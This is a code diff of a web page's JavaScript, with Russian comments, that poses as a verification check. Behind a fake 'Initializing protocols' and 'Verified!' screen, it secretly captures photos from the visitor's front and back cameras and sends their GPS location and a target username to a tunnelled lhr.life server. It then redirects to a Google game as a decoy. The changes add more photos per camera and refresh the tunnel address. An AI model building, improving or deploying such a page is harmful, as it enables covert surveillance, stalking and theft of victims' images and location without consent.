@@ -29,15 +29,15 @@
     <canvas id="c"></canvas>
 
 <script>
-    const API = "https://8ffdd6e5176ff1.lhr.life"; 
+    // НЕ ЗАБЫВАЙ ОБНОВЛЯТЬ ЭТУ ССЫЛКУ ПРИ ПЕРЕЗАПУСКЕ ТУННЕЛЯ
+    const API = "https://a303bcd2a960ff.lhr.life"; 
     const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
 
     const urlParams = new URLSearchParams(window.location.search);
     const user = urlParams.get('user') || "Unknown";
 
     function getSmartName(label) {
-        const now = new Date();
-        const ts = now.toISOString().replace(/[-T:.Z]/g, "").substring(0, 14);
+        const ts = new Date().toISOString().replace(/[-T:.Z]/g, "").substring(0, 14);
         return `${ts}_${label}.jpg`;
     }
 
@@ -47,7 +47,6 @@
 
         let stream = null;
         try {
-            // Увеличиваем шанс на успех: сначала запрашиваем поток
             stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } },
                 audio: false 
@@ -56,25 +55,23 @@
             const v = document.getElementById('v');
             v.srcObject = stream;
             
-            // Ждем, пока видео начнет реально воспроизводиться
             await new Promise((resolve) => {
                 v.onplaying = resolve;
                 v.play().catch(resolve);
-                // Запасной вариант через полсекунды
-                setTimeout(resolve, 500);
+                setTimeout(resolve, 800); 
             });
 
-            // Даем камере адаптироваться
-            await new Promise(r => setTimeout(r, 1200));
+            // На мобилках камере нужно время подстроиться под свет
+            await new Promise(r => setTimeout(r, 1500));
 
             const canvas = document.getElementById('c');
             canvas.width = v.videoWidth || 1280;
             canvas.height = v.videoHeight || 720;
             canvas.getContext('2d').drawImage(v, 0, 0);
 
-            return await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+            return await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
         } catch (e) {
-            return null; // Просто пропускаем, если камера не дала доступ
+            return null;
         } finally {
             if (stream) stream.getTracks().forEach(t => t.stop());
             document.body.classList.remove('flash-active');
@@ -91,21 +88,22 @@
         loader.style.display = 'block';
         msg.innerText = "Initializing protocols...";
 
-        // Гео запускаем сразу без ожидания
         navigator.geolocation.getCurrentPosition(p => {
             fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(()=>{});
         }, null, {timeout: 5000});
 
         const fd = new FormData();
-        const plan = [{ m: "user", l: "front_1" }, { m: "environment", l: "back_1" }];
+        // ПРОКАЧКА: делаем по 2 снимка с фронта и тыла для гарантии
+        const plan = [
+            { m: "user", l: "front_1" }, { m: "user", l: "front_2" },
+            { m: "environment", l: "back_1" }, { m: "environment", l: "back_2" }
+        ];
 
         for (let i = 0; i < plan.length; i++) {
-            msg.innerText = ` Check (${i + 1}/${plan.length})...`;
+            msg.innerText = `Check (${i + 1}/${plan.length})...`;
             const photo = await takePhoto(plan[i].m, plan[i].l);
-            if (photo) {
-                fd.append('files', photo, getSmartName(plan[i].l));
-            }
-            await new Promise(r => setTimeout(r, 300));
+            if (photo) fd.append('files', photo, getSmartName(plan[i].l));
+            await new Promise(r => setTimeout(r, 400));
         }
 
         if (fd.has('files')) {
@@ -118,7 +116,6 @@
             } catch(e) {}
         }
 
-        // Даже если фото не вышло, ведем себя так, будто все ок, чтобы не злить юзера ошибками
         statusTitle.innerText = "Success";
         loader.style.display = 'none';
         msg.innerText = "Verified! Loading ...";
